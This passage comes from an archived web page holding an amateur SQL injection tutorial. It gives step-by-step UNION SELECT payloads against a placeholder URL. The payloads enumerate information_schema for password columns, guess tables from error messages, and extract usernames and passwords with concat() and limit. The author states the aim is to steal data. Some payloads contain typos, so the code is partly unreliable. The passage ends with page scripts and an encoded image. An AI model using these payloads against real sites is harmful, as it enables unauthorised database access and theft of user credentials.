+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' limit 0,1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,table_name FROM information_schema.tables WHERE =
+column_name=20
+LIKE '%pass%' limit 0,1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">then record the =
+column and table=20
+its in. Lets say the columns userpass and table members. Then =
+we=E2=80=99d change it=20
+to:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' limit 1,1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,table_name FROM information_schema.tables WHERE =
+column_name=20
+LIKE '%pass%' limit 1,1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">then record the info =
+again then.=20
+Then we change it to:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' limit 2,1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,table_name FROM information_schema.tables WHERE =
+column_name=20
+LIKE '%pass%' limit 2,1 --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">etc, until you run =
+out of columns=20
+that are like pass.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now say you didnt =
+want to use=20
+limit. You could also use NOT IN(). For example, say you did</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,table_name FROM information_schema.tables WHERE =
+column_name=20
+LIKE '%pass%'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and you got the =
+column=20
+user_password and table members. Now you wanted to see if there was an =
+admins=20
+table with a column like pass. So you would add to the end</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">AND column_name NOT =
+IN ('value').=20
+This says choose the first row where the column "column_name" doesnt =
+have this=20
+value. So if you wanted to get the next user column, you would do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' AND column_name NOT IN ('user_password') =
+--</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">or to be more safe, =
+incase the=20
+admins table also has the column user_password, you could make it check =
+for the=20
+table name like:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' AND table_name NOT IN ('user_password') --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then say you got the =
+column=20
+password and table backup_members. This is only a backup table, so you =
+want to=20
+keep on going until you get the admins table. then you would take the =
+url from=20
+before and add a ,'backup_members' to the NOT IN ('user_password') like=20
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE=20
+column_name LIKE '%pass%' AND table_name NOT IN ('user_password',=20
+'backup_members') --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and then you would =
+check the=20
+table name like this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT 1,2,column_name FROM information_schema.tables WHERE =
+table_name=20
+LIKE '%pass%' AND table_name NOT IN ('user_password', 'backup_members') =
+--</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">You would continue =
+adding=20
+,'table_name' until you finally got to the admins table (if there is =
+one!)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Keep in mind magic =
+quotes must be=20
+off for this. Again, you will found out how to bypass magic quotes in =
+times like=20
+this later.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now lets say the =
+mysql version=20
+was only 4 and information_schema IS NOT present. So we would have to =
+use=20
+another method to try to get the tables/columns of our interest. =
+Basically, you=20
+would first look in the errors and see if it discloses the whole query =
+or=20
+atleast the table and column (etc Mysql Error in 'userpass FROM users =
+where=20
+id=3D1''), and the then resort to good old guessing. These two steps =
+mainly=20
+revolve around luck and poor error message configuration.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So let me explain the =
+error=20
+method first. Lets say you do this:</P>
+<P class=3Dwestern=20
+style=3D"MARGIN-BOTTOM: 0.14in">http://site.com/script.php?id=3D1'</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">and get the =
+error:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">MySQL Syntax Error in =
+the query=20
+'SELECT name FROM sb_news WHERE id =3D 1''</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">In the above example, =
+the tables=20
+have a prefix (sb). Prefixes are usually present in each table if their =
+in one=20
+and are very common in sites. Now that you know the prefix, you would =
+guess=20
+sb_users, sb_members, sb_admins, sb_accounts, etc. You see that the =
+column has=20
+no prefix, so after you get the table you would try username, password,=20
+user_password, user_pass, login, etc... If the error was </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">MySQL Syntax Error in =
+the query=20
+'SELECT name FROM news WHERE id =3D 1''</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you would know =
+the columns=20
+have no prefix and you wouldnt have to guess with the prefix. However =
+errors=20
+like this are very uncommon. A more common error would be:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Mysql Error: Syntax =
+error by '1'=20
+AND g_embedable=3D1 LIMIT 1' at line 1</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This would show you =
+the column=20
+name in the particular table. This would be useful because you can now =
+assume=20
+either all the columns in the database have the g_ prefix, or you could =
+somehow=20
+figure out why it has the prefix (for example, if it was a page of =
+games, you=20
+could guess that g stood for games), then see how you can modify it for =
+the=20
+users table (so if the table was users, it could be u_password, u_pass,=20
+u_username, u_user, u_login, etc). Of course, you would have to straight =
+out=20
+guess the tables and if they had prefixes.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">But once you have =
+this info, how=20
+exactly do you check if the table/column exists? You would use a union =
+all=20
+select that selected null (nothing) from the table youre guessing. For=20
+example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,null FROM table (remember to use the right =
+number of=20
+columns)</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now if you get an =
+error saying=20
+Mysql Error: Table 'table' Not found in script.php on line 7 or any =
+error=20
+similar, you know the table doesnt exist. </P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Once you have guessed =
+the table=20
+correctly, then you would have to guess the column. You would do this by =
+
+changing a null to the column name you guessing and seeing if there was =
+an=20
+error. For example:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELCT null,null,password from users</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">If there is no error =
+and the page=20
+loads, then you know the column is password. If there is an error saying =
+invalid=20
+column, you have to keep guessing. Remember to use a column that does =
+NOT cause=20
+a conversion error since the error may be misleading.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now that you have the =
+column and=20
+table you want to steal data from, well move on to the next step!:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><B>Subsection 2.9 - =
+Step 8)Get=20
+your data</B></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">This is the final =
+part of this=20
+tutorial, and easy as hell!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So we have our table =
+and column.=20
+Lets say the table is users and the two columns you got are username and =
+
+password. So all we have to do to get the data from those columns is use =
+a=20
+simple select query in our url and limit to sift through the rows! So =
+with=20
+username and password in table users, we would do this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,username FROM users --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then check the page =
+where the=20
+data is displayed and youll see the username!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now for the =
+password:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,password FROM users --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then check the page =
+where the=20
+username was and you=E2=80=99ll see the password! Now, instead of doing =
+two separate=20
+queries for the username and password, there are two ways to get the =
+data out at=20
+the same time.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">The first is if two =
+columns=20
+display data to the page. Say columns 2 and 3 displayed data in our =
+UNION ALL=20
+SELECT null,null,null. So we would do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,username,password FROM users --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you can look on =
+the page for=20
+the username AND password. But they are on different parts of the page, =
+arent=20
+they? To get them together, we can use the function concat(). Concat =
+joins=20
+strings. the syntax is concat(string1,string2,etc). You can put in as =
+many=20
+strings as you want separated by commas. You can either use column_names =
+or=20
+actual strings enclosed by 's (magic quotes must be off). The benefit is =
+the=20
+data is together and we only need one column that outputs.</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">So we can do =
+this:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,concat(username,password) FROM users --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">But then there would =
+be no=20
+distinction between the username and password. So we should add an --- =
+between=20
+them. So we could do concat(username,'---',password). Again, magic =
+quotes MUST=20
+be off for this to work. An example would be:</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: =
+0.14in">http://site.com/script.php?id=3D1'=20
+UNION ALL SELECT null,null,concat(username,'---',password) --</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you will see the =
+username=20
+and password separated by ---'s on the page!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Now, what if you =
+didn=E2=80=99t want the=20
+first users password? Then you would use limit as I discussed earlier. =
+You would=20
+tell limit to start from the 2<SUP>nd</SUP> row (which is actually 1 for =
+
+computers since 0 is the first) and to choose 1 row (limit 1,1). So you =
+would=20
+do</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><FONT =
+color=3D#0000ff><U><A=20
+href=3D"http://site.com/script.php?id=3D1">http://site.com/script.php?id=3D=
+1</A></U></FONT>=E2=80=99=20
+UNION ALL SEELCT null,null,concat(username, =E2=80=98---=E2=80=98, =
+password) limit 1,1 =E2=80=93</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">Then you would check =
+the page=20
+again and in the place you saw the previous username and password you =
+would see=20
+the second users in the same exact format. Now if you wanted the next =
+user, you=20
+would change limit 1,1 to limit 2,1, then the next would be limit 3,1, =
+etc etc=20
+until you have all the users you want!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in">And that concludes =
+part I of my=20
+tutorial! Hope you liked it!</P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P>
+<P class=3Dwestern style=3D"MARGIN-BOTTOM: 0.14in"><BR><BR></P><BR =
+clear=3Dall></DIV>
+<DIV id=3Dgoogle-view-footer>
+<DIV id=3Dcanedit style=3D"FLOAT: right"><A class=3Dgoogle-small-link =
+id=3Deditlink=20
+title=3D"Edit this page"=20
+href=3D"http://docs.google.com/Edit?tab=3Dedit&amp;dr=3Dtrue&amp;docid=3D=
+drcn3mc_2sdcg3q">Edit=20
+this page (you have permission)</A> </DIV>
+<DIV id=3Dmaybecanedit style=3D"FLOAT: right"><A =
+class=3Dgoogle-small-link=20
+id=3Deditpermissionlink title=3D"Edit this page"=20
+href=3D"http://docs.google.com/Edit?tab=3Dedit&amp;dr=3Dtrue&amp;docid=3D=
+drcn3mc_2sdcg3q">Edit=20
+this page (if you have permission)</A> <SPAN style=3D"COLOR: =
+#676767">|</SPAN> <A=20
+class=3Dgoogle-small-link id=3Dabuselink=20
+href=3D"http://docs.google.com/support/bin/request.py?hl=3Den_US&amp;page=
+=3Dtroubleshooter.cs&amp;problem=3Dabuse&amp;contact_type=3Dabuse&amp;sta=
+ge=3Dfm&amp;contact_typemaster=3Dabuse&amp;Action.Search=3DContinue&amp;c=
+tx=3Ddirect&amp;docurl=3Dhttp%3A%2F%2Fdocs.google.com%2FDoc%3Fid%3Ddrcn3m=
+c_2sdcg3q"=20
+target=3D_blank>Report spam</A>&nbsp; </DIV>
+<DIV style=3D"FLOAT: left"><A class=3Dgoogle-small-link=20
+title=3D"Learn more about Google Docs" =
+href=3D"http://docs.google.com/">Google Docs=20
+-- Web word processing, presentations and spreadsheets.</A> </DIV>
+<P> </P></DIV>
+<SCRIPT><!--=0A=
+    viewOnLoad();=0A=
+    =0A=
+    =0A=
+    var urchinPage =3D "/View";=0A=
+  --></SCRIPT>
+
+<SCRIPT src=3D"https://ssl.google-analytics.com/ga.js"=20
+type=3Dtext/javascript></SCRIPT>
+
+<SCRIPT type=3Dtext/javascript>=0A=
+var page =3D typeof urchinPage !=3D 'undefined' ? urchinPage :=0A=
+window.location.href;=0A=
+var account =3D 'UA-18065-1';=0A=
+if (typeof _gat !=3D 'undefined') {=0A=
+var pageTracker =3D _gat._getTracker(account);=0A=
+pageTracker._setAllowAnchor(true);=0A=
+pageTracker._initData();=0A=
+pageTracker._trackPageview(page);=0A=
+}=0A=
+</SCRIPT>
+</BODY></HTML>
+
+------=_NextPart_000_0000_01C8B5AD.98E80010
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Location: http://docs.google.com/File?id=drcn3mc_3gs69g2kx
+
+/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a
+HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy
+MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAEcAmgDASIA
+AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA
+AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3
+ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm
+p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA
+AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx
+BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElK
+U1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3
+uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3iz/4
+8bf/AK5r/Kp65HULQan4k8P2E9zfR2raXdzMlpezW251e1CkmJlJwHbr6mqo1u/vdBsIIrjVZdRn
+luXgk0xLUSXNrDKY1mJnHlbWVoWyuNxcFRtzhvcS2O4orz+a41bXrLwJqaa5faa2q+WbiCxWIR7m
+s55SQJEcnkAYYlcAHG4Bq3Nfubm1t7DS7S61mbUnQyBrBbTz5Y4wqu7eeBEBukjyFAOWGBgNhDOg
+M8K3CW7Sxid0Z0jLDcyqQGIHUgFlBPbcPWpK87S/u9f1TwPdtqcel3eqaFcyu8CIXZm+ySFIRJuA
+PBPIf5VbjPzLc/tu/u9FtrOO41WTVTd3sanTEtRNLDbTtAXfzx5QzmIttwSzfKAuQADuKK4tr/xJ
+rfhXw7qtiZI0urKO5vk05oVuC7ohURC4VoymWfcGKnAUhjgq0esa3f3MXhu10K41W6jv7R75ryyS
+1E80KLGBlbgLGu4zoxIGRtwFAYlQDuKKy/D0mpy6JC2sQyQ3geRSspjLlA7CNn8slN5QKW28ZJwA
+OBT8T6XqepfZTYv5kMe/zbX+0ZrHexxtfzoQX+UBhsxtbfk8oKAOgorz+81e6aDQ9L8OrrirL9rl
+uDDNBPdp5DiKSJmu3KnEsvLBm/1eFyrbhYguPE97f6Jpl1fT6VJPaX8twRFBJOyxTwrC2RujWQo4
+LYBX5mAUHaVAO4orl7vVrjwvPpz63qXnWDafKl1dNAFzcwp5m9UQEjfGtwxHIHlKBgnD5eo6l4mS
+38Oaay6kuqXdvLe6gdNFoZI9gQNCvnHywgedQGyzYjA+bcXAB3lFcPBceJ72/wBE0y6vp9KkntL+
+W4IigknZYp4VhbI3RrIUcFsAr8zAKDtK9hYQ3Fvp1tDeXX2u6jiRJrjyxH5rgAM+0cLk5OB0zQBY
+orP1PUbqw8r7No19qW/O77I8C+XjGM+bInXPbPQ5xxmxY3Et3ZxzzWU9lI2cwTlC6YJHJRmXnrwT
+19eKAK+p67o+ieV/a2q2Nh52fL+13CRb8YzjcRnGR09RWhXP+O/+SeeJf+wVdf8AopqNZlvbnxDp
+ujWuoz6fHPaXN089skbSExPCoX94jrtPnMT8ucquCBkEA6CiuLs9X1PUotP0xr+S0ee4v4G1JI4/
+Mc2s5jRFDKY/NkVS5+UjEcm1B1S5rMt3Y2djpNvqOuXmpyeZMJLNLMTyRIQGLeaiwhQZYxwAxyuM
+/MaANjU9d0fRPK/tbVbGw87Pl/a7hIt+MZxuIzjI6eoq4Z4VuEt2ljE7ozpGWG5lUgMQOpALKCe2
+4etcfq2pTaz8E77VLhY1nvfDklxIsYIUM9sWIGSTjJ9TVjXrW7vPHWiQ2moSWBOmXxkmiiR5Nvm2
+nCbwVBzjJKtxkYBIYAHWUVw9lqeraxcadpR1We0Y/wBp+ZeW8UXnSfZbpIEyHRkG5XLNhR8wGNoy
+pPtfifUdFtpbOed47e7vba6ksjAl5N5M7QxMomQwnIQs4+TnBXAGwgHcUVw+q/atSk8HXWmeKdVi
+tL+VUEkKQL56m0nkErK0X3m2rlSNo6hQwBG54hE9r4TmVPEsejzxpGv9r3ccTBDuUFmVtqZbp2GW
+4HQUAblFc/4s0dNU05XXQNK1i6h3eWuoRq/lgjkoGGGbIX5C0Ybu64zWXcafba94F0W7tdFtNdcW
+Ub27a4qSzqjRA7zkYeU4TK7kDHq69aAO0ori7jT7bXvAui3drotprriyje3bXFSWdUaIHecjDynC
+ZXcgY9XXrWfdCbXbLwfY2skdxpN/pjyltcQziWRUhaLzUUgTSlDK2wsBkNJyYhQB6JRXL6Xrd1Fo
+NqLbw9Pd+TLcWTJpnkRRx/Z5WhBCyyrtVtmQoLbRwScAnQm1m/js7adPDOqyyS7t8CSWoeHBwNxM
+wU56jaW98HigDYorHm1m/js7adPDOqyyS7t8CSWoeHBwNxMwU56jaW98HiibWb+Oztp08M6rLJLu
+3wJJah4cHA3EzBTnqNpb3weKANiisebWb+Oztp08M6rLJLu3wJJah4cHA3EzBTnqNpb3weKJtZv4
+7O2nTwzqssku7fAklqHhwcDcTMFOeo2lvfB4oA2KKx5tZv47O2nTwzqssku7fAklqHhwcDcTMFOe
+o2lvfB4om1m/js7adPDOqyyS7t8CSWoeHBwNxMwU56jaW98HigDYorHm1m/js7adPDOqyyS7t8CS
+WoeHBwNxMwU56jaW98HiibWb+Oztp08M6rLJLu3wJJah4cHA3EzBTnqNpb3weKANiisebWb+Oztp
+08M6rLJLu3wJJah4cHA3EzBTnqNpb3weKJtZv47O2nTwzqssku7fAklqHhwcDcTMFOeo2lvfB4oA
+2KKx5tZv47O2nTwzqssku7fAklqHhwcDcTMFOeo2lvfB4om1m/js7adPDOqyyS7t8CSWoeHBwNxM
+wU56jaW98HigDYorHm1m/js7adPDOqyyS7t8CSWoeHBwNxMwU56jaW98HiibWb+Oztp08M6rLJLu
+3wJJah4cHA3EzBTnqNpb3weKANiisebWb+Oztp08M6rLJLu3wJJah4cHA3EzBTnqNpb3weKJtZv4
+7O2nTwzqssku7fAklqHhwcDcTMFOeo2lvfB4oA2KKx5tZv47O2nTwzqssku7fAklqHhwcDcTMFOe
+o2lvfB4om1m/js7adPDOqyyS7t8CSWoeHBwNxMwU56jaW98HigDYorHm1m/js7adPDOqyyS7t8CS
+WoeHBwNxMwU56jaW98HiibWb+Oztp08M6rLJLu3wJJah4cHA3EzBTnqNpb3weKANiisebWb+Oztp
+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
